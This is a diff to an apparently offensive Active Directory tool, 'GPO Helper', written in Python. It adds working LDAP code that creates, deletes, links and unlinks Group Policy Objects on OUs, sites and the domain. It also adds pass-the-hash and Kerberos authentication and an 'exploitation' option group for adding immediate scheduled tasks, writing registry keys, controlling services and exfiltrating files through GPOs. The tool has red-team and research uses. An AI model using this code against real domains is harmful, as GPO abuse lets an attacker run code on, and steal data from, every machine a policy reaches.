+            self.ldaprecords.append(entry["distinguishedname"])
+
+        if self.ldaprecords[0] != ' ':
+
+            old_gPLink = self.ldaprecords[0]
+
+            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]{old_gPLink}'
+
+        else:
+
+            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]'
+
+        OUDn =self.ldaprecords[1]
+
+        print(f"[+] OU dn is {OUDn}")
+        print(f"[+] OU old gPLink is {self.ldaprecords[0]}")
+        print(f"[+] New gPLink is {new_gPLink}")
+
+        self.ldapconn.modify(str(OUDn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})
+
+        if not self.ldapconn.result['description'] == 'success':
+            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
+            sys.exit()
+        
+        print("[+] GPO linked successfully")
+        sys.exit()
+
+    def LinkGPOTOSITE(self,SITEName,GPOName):
+
+        target = self.get_machine_name(self.__options, self.__domain)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+
+        #getting the gpo hex
+
+        print(f"[+] Checking if GPO {GPOName} exists")
+
+        base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        self.ldapconn.search(
+            search_base='CN=Policies,CN=System,' + base,
+            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
+            attributes=['distinguishedName','cn']
+        )
+
+        if len(self.ldapconn.entries) == 0:
+
+            print("[-] GPO not found in the domain")
+            exit(1)
+        
+        gpo_hex = str(self.ldapconn.entries[0].cn)
+
+        print(f"[+] GPO with hex {gpo_hex} found")
+
+        #getting info from the SITE
+        print(f"[+] Checking if SITE {SITEName} exists")
+        self.ldaprecords = []   
+        dn_prefix = "CN=Sites,CN=Configuration,"
+        searchFilter = "(&(objectCategory=site)(name=%s))" % (SITEName)      
+
+        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES, dn_prefix)
+
+        if retvalue != True:
+                raise
+
+        entries = self.ldapconn.entries
+
+        if len(entries) == 0:
+
+            print("[-] SITE not found")
+            exit(1)
+
+        for entry in entries:
+            
+            try:
+
+                self.ldaprecords.append(entry["gPLink"])
+
+            except ldap3.core.exceptions.LDAPKeyError:
+
+                self.ldaprecords.append(' ')
+
+            self.ldaprecords.append(entry["distinguishedname"])
+
+        if self.ldaprecords[0] != ' ':
+
+            old_gPLink = self.ldaprecords[0]
+
+            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]{old_gPLink}'
+
+        else:
+
+            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]'
+
+        SITEDn =self.ldaprecords[1]
+
+        print(f"[+] SITE dn is {SITEDn}")
+        print(f"[+] SITE old gPLink is {self.ldaprecords[0]}")
+        print(f"[+] New gPLink is {new_gPLink}")
+
+        self.ldapconn.modify(str(SITEDn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})
+
+        if not self.ldapconn.result['description'] == 'success':
+            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
+            sys.exit()
+        
+        print("[+] GPO linked successfully")
+        sys.exit()
+
+    def RemoveLinkSITE(self, SITEName,GPOName):
+        target = self.get_machine_name(self.__options, self.__domain)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+        
+        #getting the gpo hex
+
+        print(f"[+] Checking if GPO {GPOName} exists")
+
+        base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        self.ldapconn.search(
+            search_base='CN=Policies,CN=System,' + base,
+            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
+            attributes=['distinguishedName','cn']
+        )
+
+        if len(self.ldapconn.entries) == 0:
+
+            print("[-] GPO not found in the domain")
+            exit(1)
+        
+        gpo_hex = str(self.ldapconn.entries[0].cn)
+
+        print(f"[+] GPO with hex {gpo_hex} found")
+
+        #getting info from the SITE
+        print(f"[+] Checking if SITE {SITEName} exists")
+        self.ldaprecords = []   
+        dn_prefix = "CN=Sites,CN=Configuration,"
+        searchFilter = "(&(objectCategory=site)(name=%s))" % (SITEName)      
+
+        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES, dn_prefix)
+        if retvalue != True:
+                raise
+
+        entries = self.ldapconn.entries
+
+        if len(entries) == 0:
+
+            print("[-] SITE not found")
+            exit(1)
+
+        for entry in entries:
+            
+            try:
+
+                self.ldaprecords.append(entry["gPLink"])
+
+            except ldap3.core.exceptions.LDAPKeyError:
+
+                self.ldaprecords.append(' ')
+
+            self.ldaprecords.append(entry["distinguishedname"])
+
+        if self.ldaprecords[0] == ' ':
+
+            print("[-] Attribute gPlink is empty, no link exist in this SITE")
+
+            sys.exit(1)
+
+
+        old_gPLink = str(self.ldaprecords[0])
+
+        new_gPLink = ''
+
+        found = False
+
+        for link in old_gPLink.split("["):
+
+            if str(gpo_hex) in str(link):
+                
+                found = True
+                continue
+
+            new_gPLink += f"[{link}"
+
+        if found is not True:
+
+            print(f"[-] The GPO guid was not found in this gPLink")
+            sys.exit(1)
+
+        new_gPLink = new_gPLink[1::]
+
+        SITEDn =self.ldaprecords[1]
+
+        print(f"[+] SITE dn is {SITEDn}")
+        print(f"[+] SITE old gPLink is {self.ldaprecords[0]}")
+        print(f"[+] New gPLink is {new_gPLink}")
+
+        if new_gPLink == '':
+
+            self.ldapconn.modify(str(SITEDn), {'gplink': [(ldap3.MODIFY_REPLACE, [])]})
+
+        else:
+
+            self.ldapconn.modify(str(SITEDn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})
+
+        if not self.ldapconn.result['description'] == 'success':
+            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
+            sys.exit()
+        
+        print("[+] Removed old gpo link")
+        sys.exit()
+
+    def LinkGPOTODOMAIN(self,GPOName):
+
+        target = self.get_machine_name(self.__options, self.__domain)
+        domain_dn = self.DomainToDN(self.__domain)
+        
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+
+        #getting the gpo hex
+
+        print(f"[+] Checking if GPO {GPOName} exists")
+
+        base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        self.ldapconn.search(
+            search_base='CN=Policies,CN=System,' + base,
+            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
+            attributes=['distinguishedName','cn']
+        )
+
+        if len(self.ldapconn.entries) == 0:
+
+            print("[-] GPO not found in the domain")
+            exit(1)
+        
+        gpo_hex = str(self.ldapconn.entries[0].cn)
+
+        print(f"[+] GPO with hex {gpo_hex} found")
+
+        #getting info from the domain
+        print(f"[+] Checking if DOMAIN {domain_dn} exists")
+        self.ldaprecords = []   
+        searchFilter = "(&(objectClass=*)(distinguishedname=%s))" % domain_dn     
+
+        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
+
+        if retvalue != True:
+                raise
+
+        entries = self.ldapconn.entries
+
+        if len(entries) == 0:
+
+            print("[-] Domain not found")
+            exit(1)
+
+        for entry in entries:
+            
+            try:
+
+                self.ldaprecords.append(entry["gPLink"])
+
+            except ldap3.core.exceptions.LDAPKeyError:
+
+                self.ldaprecords.append(' ')
+
+            self.ldaprecords.append(entry["distinguishedname"])
+
+        if self.ldaprecords[0] != ' ':
+
+            old_gPLink = self.ldaprecords[0]
+
+            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]{old_gPLink}'
+
+        else:
+
+            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]'
+
+        print(f"[+] Domain dn is {domain_dn}")
+        print(f"[+] Domain old gPLink is {self.ldaprecords[0]}")
+        print(f"[+] New gPLink is {new_gPLink}")
+
+        self.ldapconn.modify(str(domain_dn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})
+
+        if not self.ldapconn.result['description'] == 'success':
+            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
+            sys.exit()
+        
+        print("[+] GPO linked successfully")
+        sys.exit()
+
+    def RemoveLinkDOMAIN(self,GPOName):
+        target = self.get_machine_name(self.__options, self.__domain)
+        domain_dn = self.DomainToDN(self.__domain)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+        
+        #getting the gpo hex
+
+        print(f"[+] Checking if GPO {GPOName} exists")
+
+        base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        self.ldapconn.search(
+            search_base='CN=Policies,CN=System,' + base,
+            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
+            attributes=['distinguishedName','cn']
+        )
+
+        if len(self.ldapconn.entries) == 0:
+
+            print("[-] GPO not found in the domain")
+            exit(1)
+        
+        gpo_hex = str(self.ldapconn.entries[0].cn)
+
+        print(f"[+] GPO with hex {gpo_hex} found")
+
+        #getting info from the DOMAIN
+        print(f"[+] Checking if DOMAIN {domain_dn} exists")
+        self.ldaprecords = []   
+        searchFilter = "(&(objectClass=*)(distinguishedname=%s))" % domain_dn
+
+        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
+        if retvalue != True:
+                raise
+
+        entries = self.ldapconn.entries
+
+        if len(entries) == 0:
+
+            print("[-] DOMAIN not found")
+            exit(1)
+
+        for entry in entries:
+            
+            try:
+
+                self.ldaprecords.append(entry["gPLink"])
+
+            except ldap3.core.exceptions.LDAPKeyError:
+
+                self.ldaprecords.append(' ')
+
+            self.ldaprecords.append(entry["distinguishedname"])
+
+        if self.ldaprecords[0] == ' ':
+
+            print("[-] Attribute gPlink is empty, no link exist in this SITE")
+
+            sys.exit(1)
+
+
+        old_gPLink = str(self.ldaprecords[0])
+
+        new_gPLink = ''
+
+        found = False
+
+        for link in old_gPLink.split("["):
+
+            if str(gpo_hex) in str(link):
+                
+                found = True
+                continue
+
+            new_gPLink += f"[{link}"
+
+        if found is not True:
+
+            print(f"[-] The GPO guid was not found in this gPLink")
+            sys.exit(1)
+
+        new_gPLink = new_gPLink[1::]
+
+        print(f"[+] DOMAIN dn is {domain_dn}")
+        print(f"[+] SITE old gPLink is {self.ldaprecords[0]}")
+        print(f"[+] New gPLink is {new_gPLink}")
+
+        if new_gPLink == '':
+
+            self.ldapconn.modify(str(domain_dn), {'gplink': [(ldap3.MODIFY_REPLACE, [])]})
+
+        else:
+
+            self.ldapconn.modify(str(domain_dn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})
+
+        if not self.ldapconn.result['description'] == 'success':
+            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
+            sys.exit()
+        
+        print("[+] Removed old gpo link")
+        sys.exit()
 
     def GPOService(self, action, name, gpo):
         (path, info, dn) = self.extractInfo(gpo)
@@ -638,55 +1784,106 @@ class GPOhelper:
             self.SMBWriteFile(xmlPath, modified)
         self.updateGUID(info, k, ['Group Policy Scheduled Tasks', 'Scheduled Tasks'], dn)
 
-def main():
+    def get_machine_name(self,args, domain):
+        if args.dc_ip is not None:
+            s = SMBConnection(args.dc_ip, args.dc_ip)
+        else:
+            s = SMBConnection(domain, domain)
+        try:
+            s.login('', '')
+        except Exception:
+            if s.getServerName() == '':
+                raise Exception('Error while anonymous logging into %s' % domain)
+        else:
+            s.logoff()
+        return s.getServerName()
+
+def parse_args():
     parser = argparse.ArgumentParser(add_help = True, description = "GPO Helper - @TheXC3LL")
-    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
-    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
-    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
-    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
-    parser.add_argument('-dc-ip', action="store", metavar = "ip address", help='IP Address of the domain controller')
-    parser.add_argument('-listgpo', action="store_true", help='Retrieve GPOs info using LDAP')
-    parser.add_argument('-displayname', action="store", metavar = "display name", help='Filter using the given displayName [only with -listgpo]')
-    parser.add_argument('-name', action="store", metavar = 'GPO name', help='Filter using the GPO name ({Hex})')
-    parser.add_argument('-listgplink', action="store_true", help='Retrieve the objects the GPO is linked to')
-    parser.add_argument('-ou', action="store", metavar = 'GPO name', help='Filter using the ou [only with -listgplinks]')
-    parser.add_argument('-gpocopyfile', action="store_true", help='Edit the target GPO to copy a file to the target location')
-    parser.add_argument('-gpomkdir', action="store_true", help='Edit the target GPO to create a new folder')
-    parser.add_argument('-gporegcreate', action = "store_true", help='Edit the target GPO to create a registry key/subkey')
-    parser.add_argument('-gposervice', action="store_true", help='Edit the target GPO to start/stop/restart a service')
-    parser.add_argument('-gpoexfilfiles', action="store_true", help='Edit the target GPO to exfil a file (* to all) to the target location')
-    parser.add_argument('-gpoimmtask', action="store_true", help='Edit the target GPO to add a Immediate Task')
-    parser.add_argument('-gpoimmuser', action="store", metavar="User for ImmTask", help="User to run the immediate task")
-    parser.add_argument('-srcpath', action="store", metavar='Source file', help='Local file path')
-    parser.add_argument('-dstpath', action="store", metavar='Destination path', help='Destination path')
-    parser.add_argument('-hive', action="store", metavar='Registry Hive', help="Registry Hive")
-    parser.add_argument('-type', action="store", metavar='Type', help="Type of value")
-    parser.add_argument('-key', action="store", metavar='Registry key', help="Registry key")
-    parser.add_argument('-subkey', action="store", metavar='Registry subkey', help="Registry subkey")
-    parser.add_argument('-default', action="store_true", help="Sets new value es default")
-    parser.add_argument('-value', action="store", metavar="Registry value", help="Registry value")
-    parser.add_argument('-service', action="store", metavar="Target service", help="Target service to be started/stopped/restarted")
-    parser.add_argument('-action', action="store", metavar="Service action", help="Posible values: start, stop & restart")
-    parser.add_argument('-author', action="store", metavar="Task Author", help="Author for Scheduled Task")
-    parser.add_argument('-taskname', action="store", metavar="Task Name", help="Name for the Scheduled Task")
-    parser.add_argument('-taskdescription', action="store", metavar="Task description", help="Description for the scheduled task")
-    parser.add_argument('-gpcuser', action="store_true", help="GPO is related to users")
-    parser.add_argument('-gpcmachine', action="store_true", help="GPO is related to machines")
-    parser.add_argument('-gpoupdatever', action="store_true", help="Update GPO version (GPT.INI file and LDAP object)")
-    parser.add_argument('-usercontext', action="store_true", help="Execute the GPO in the context of the user")
-    parser.add_argument('-backup', action="store", metavar="Backup location", help="Location of backup folder")
-    options = parser.parse_args()
+    
+    auth_con = parser.add_argument_group('authentication & connection')
+    auth_con.add_argument('-u', '--username', action="store", default='', help='valid username')
+    auth_con.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
+    auth_con.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
+    auth_con.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
+    auth_con.add_argument('-dc-ip', action="store", metavar = "ip address / hostname", help='IP Address of the domain controller or the fqdn use when -k')
+    auth_con.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
+    parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
+    parser.add_argument('-no-pass', action='store_true', help='tell the script to not use password, good with -k')
+    auth_con.add_argument('-k', action="store_true", help='Tell the script to use kerberos auth')
 
+    enumeration = parser.add_argument_group("enumeration")
+    enumeration.add_argument('-listgpo', action="store_true", help='Retrieve GPOs info using LDAP')
+    enumeration.add_argument('-listsite', action="store_true", help="Retrieve SITE info using LDAP")
+    enumeration.add_argument('-listou', action="store_true", help="Retrieve OU info using LDAP")
+    enumeration.add_argument('-listdomain', action="store_true", help="Retrieve info from the domain object, such as the gPLink one")
+    enumeration.add_argument('-displayname', action="store", metavar = "display name", help='Filter using the given displayName [only with -listgpo]')
+    enumeration.add_argument('-listgplink', action="store_true", help='Retrieve the objects the GPO is linked to')
+    
+    gpo_modification = parser.add_argument_group("Creation / Deletion / Linking")
+    gpo_modification.add_argument('-linkgpotoou', action="store_true", help='Tell the script to link a gpo to a OU, the OU needs to be passed at -ouname and a gpo with -name')
+    gpo_modification.add_argument('-linkgpotosite', action="store_true", help='Tell the script to link a gpo to a SITE, the SITE needs to be passed at -sitename and a gpo with -name')
+    gpo_modification.add_argument('-linkgpotodomain', action="store_true", help='Tell the script to link a gpo to a DOMAIN, the DOMAIN needs to be passed at -d and a gpo with -name')
+    gpo_modification.add_argument('-removelinkou', action="store_true", help="tell the script to remove a gpo link from a OU, needs to be passed at -ouname and a gpo with -name")
+    gpo_modification.add_argument('-removelinkdomain', action="store_true", help="tell the script to remove a gpo link from a DOMAIN, needs to be passed at -d and a gpo with -name")
+    gpo_modification.add_argument('-removelinksite', action="store_true", help="tell the script to remove a gpo link from a SITE, needs to be passed at -sitename and a gpo with -name")
+    gpo_modification.add_argument('-creategpo', action="store_true", help="tell the script to create a gpo")
+    gpo_modification.add_argument('-deletegpo', action="store_true", help="tell the script to remove a gpo")
+    gpo_modification.add_argument('-comment', action="store", help="Tell the script to add a GPO.cmt with a text to the new created gpo.")
+    
+    general = parser.add_argument_group("General parameters that can be passed to multiple commands")
+    general.add_argument('-ou', action="store", metavar = 'GPO name', help='Filter using the ou [only with -listgplinks]')
+    general.add_argument('-name', action="store", metavar = 'GPO name', help='Filter using the GPO name ({Hex}) or gpo name to add,delete when using -creategpo / -deletegpo')
+    general.add_argument('-ouname', action="store", metavar="ouname", help='Tell the script what OU to link the gpo')
+    general.add_argument('-sitename', action="store", metavar="sitename", help='Tell the script what SITE to link the gpo')
+    general.add_argument('-gpcuser', action="store_true", help="GPO is related to users")
+    general.add_argument('-gpcmachine', action="store_true", help="GPO is related to machines")
+    
+    backup = parser.add_argument_group("backup")
+    backup.add_argument('-backup', action="store", metavar="Backup location", help="Location of backup folder")
+    
+    exploitation = parser.add_argument_group("exploitation")
+    exploitation.add_argument('-gpocopyfile', action="store_true", help='Edit the target GPO to copy a file to the target location')
+    exploitation.add_argument('-gpomkdir', action="store_true", help='Edit the target GPO to create a new folder')
+    exploitation.add_argument('-gporegcreate', action = "store_true", help='Edit the target GPO to create a registry key/subkey')
+    exploitation.add_argument('-gposervice', action="store_true", help='Edit the target GPO to start/stop/restart a service')
+    exploitation.add_argument('-gpoexfilfiles', action="store_true", help='Edit the target GPO to exfil a file (* to all) to the target location')
+    exploitation.add_argument('-gpoimmtask', action="store_true", help='Edit the target GPO to add a Immediate Task')
+    exploitation.add_argument('-gpoimmuser', action="store", metavar="User for ImmTask", help="User to run the immediate task")
+    exploitation.add_argument('-srcpath', action="store", metavar='Source file', help='Local file path')
+    exploitation.add_argument('-dstpath', action="store", metavar='Destination path', help='Destination path')
+    exploitation.add_argument('-hive', action="store", metavar='Registry Hive', help="Registry Hive")
+    exploitation.add_argument('-type', action="store", metavar='Type', help="Type of value")
+    exploitation.add_argument('-key', action="store", metavar='Registry key', help="Registry key")
+    exploitation.add_argument('-subkey', action="store", metavar='Registry subkey', help="Registry subkey")
+    exploitation.add_argument('-default', action="store_true", help="Sets new value es default")
+    exploitation.add_argument('-value', action="store", metavar="Registry value", help="Registry value")
+    exploitation.add_argument('-service', action="store", metavar="Target service", help="Target service to be started/stopped/restarted")
+    exploitation.add_argument('-action', action="store", metavar="Service action", help="Posible values: start, stop & restart")
+    exploitation.add_argument('-author', action="store", metavar="Task Author", help="Author for Scheduled Task")
+    exploitation.add_argument('-taskname', action="store", metavar="Task Name", help="Name for the Scheduled Task")
+    exploitation.add_argument('-taskdescription', action="store", metavar="Task description", help="Description for the scheduled task")
+    exploitation.add_argument('-gpoupdatever', action="store_true", help="Update GPO version (GPT.INI file and LDAP object)")
+    exploitation.add_argument('-usercontext', action="store_true", help="Execute the GPO in the context of the user")
 
-    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
+    return parser.parse_args()
+
+def main():
+
+    options = parse_args()
+
+    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True and options.k is not True and options.aesKey is None:
         from getpass import getpass
         options.password = getpass("Password:")
+
+    if options.aesKey is not None:
+        options.k = True
 
     if options.hashes is not None:
         lmhash, nthash = options.hashes.split(':')
     else:
-        lmhash = ''
-        nthash = ''
+        lmhash = None
+        nthash = None
 
     if options.gpcuser is True:
         scope = "gPCUserExtensionNames"
@@ -700,7 +1897,37 @@ def main():
         context = str(1)
     else:
         context = str(0)
-    helper = GPOhelper(options.username, options.password, options.domain, lmhash, nthash, options.dc_ip, scope, context)
+    helper = GPOhelper(options.username, options.password, options.domain, lmhash, nthash, options.dc_ip, scope, context, options.k, options.aesKey, options)
+
+    # -listsite
+    if options.listsite is True:
+        name = '*'
+        if options.name is not None:
+            name = options.name
+        records = helper.ldapGPOFromSiteInfo(name)
+        for x in records:
+            print("\n[+] Name: %s\n\t[-] distinguishedName: %s\n\t[-] gPLink: %s\n\t[-] objectGUID: %s\n\t[-] objectcategory: %s" % (x["Name"], x["distinguishedName"], x["gPLink"], x["objectGUID"], x['objectcategory']))
+
+    # -listou
+    if options.listou is True:
+        name = '*'
+        if options.name is not None:
+            name = options.name
+        records = helper.ldapGPOFromOUInfo(name)
+        for x in records:
+            print("\n[+] Name: %s\n\t[-] distinguishedName: %s\n\t[-] gPLink: %s\n\t[-] objectGUID: %s\n\t[-] objectcategory: %s" % (x["Name"], x["distinguishedName"], x["gPLink"], x["objectGUID"], x['objectcategory']))
+
+    # -listdomain
+    if options.listdomain is True:
+        name = '*'
+        if options.name is not None:
+            name = options.name
+        if options.domain is None:
+            print("[-] A -domain needs to be passed")
+            sys.exit(1)
+        records = helper.ldapGPOFromDomainInfo(name)
+        for x in records:
+            print("\n[+] Name: %s\n\t[-] distinguishedName: %s\n\t[-] gPLink: %s\n\t[-] objectGUID: %s\n\t[-] objectcategory: %s" % (x["Name"], x["distinguishedName"], x["gPLink"], x["objectGUID"], x['objectcategory']))
 
     # -listgpo
     if options.listgpo is True:
@@ -731,6 +1958,91 @@ def main():
         records = helper.ldapGplinkInfo(ou, name)
         for x in records:
             print("\n[+] Name: %s\n\t[-] distinguishedName: %s\n\t[-] gPLink: %s" % (x["Name"], x["dn"], x["gPLink"]))
+
+    # -linkgpotoou
+    if options.linkgpotoou is True:
+
+        if options.name == None or options.ouname == None:
+
+            print("[-] A -name and -ouname needs to be passed")
+            exit(1)
+
+        helper.LinkGPOTOOU(options.ouname, options.name)
+
+    # -linkgpotodomain
+    if options.linkgpotodomain is True:
+        if options.name == None or options.domain == None:
+            print("[-] A -name and -domain needs to be passed")
+            exit(1)
+
+        helper.LinkGPOTODOMAIN(options.name)
+
+    # -removelinkdomain
+    if options.removelinkdomain is True:
+
+        if options.name == None or options.domain == None:
+
+            print("[-] A -name and -domain needs to be passed")
+            exit(1)
+
+        helper.RemoveLinkDOMAIN(options.name)
+
+    # -removelinkou
+    if options.removelinkou is True:
+
+        if options.name == None or options.ouname == None:
+
+            print("[-] A -name and -ouname needs to be passed")
+            exit(1)
+
+        helper.RemoveLinkOU(options.ouname, options.name)   
+
+    # -linkgpotosite
+    if options.linkgpotosite is True:
+
+        if options.name == None or options.sitename == None:
+
+            print("[-] A -name and -sitename needs to be passed")
+            exit(1)
+
+        helper.LinkGPOTOSITE(options.sitename,options.name)
+
+    # -removelinksite
+    if options.removelinksite is True:
+
+        if options.name == None or options.sitename == None:
+
+            print("[-] A -name and -sitename needs to be passed")
+            exit(1)
+
+        helper.RemoveLinkSITE(options.sitename,options.name)
+
+    # -creategpo
+    if options.creategpo is True:
+
+        if options.name == None:
+
+            print("[-] A -name to create a gpo is necessary.")
+            exit(1)
+
+        if helper.CheckForDuplicates(options.name) == False:
+
+            helper.CreateGPO(options.name)
+            exit(0)
+
+        exit(1)
+
+
+    # -deletegpo
+    if options.deletegpo is True:
+
+        if options.name == None:
+
+            print("[-] A -name to delete a gpo is necessary.")
+            exit(1)
+
+        helper.DeleteGPO(options.name)
+        exit(0)
 
     # -gpocopyfile
     if options.gpocopyfile is True:
@@ -814,7 +2126,8 @@ def main():
         helper.GPOBackup(options.backup, options.name)
 
 if __name__ == "__main__":
-    print("\t\tGPO Helper - @TheXC3LL\n\n")
+    print("\t\tGPO Helper - @TheXC3LL")
+    print("\t\tModifications by - @Fabrizzio53\n\n")
 
     main()
     print("\n[^] Have a nice day!")
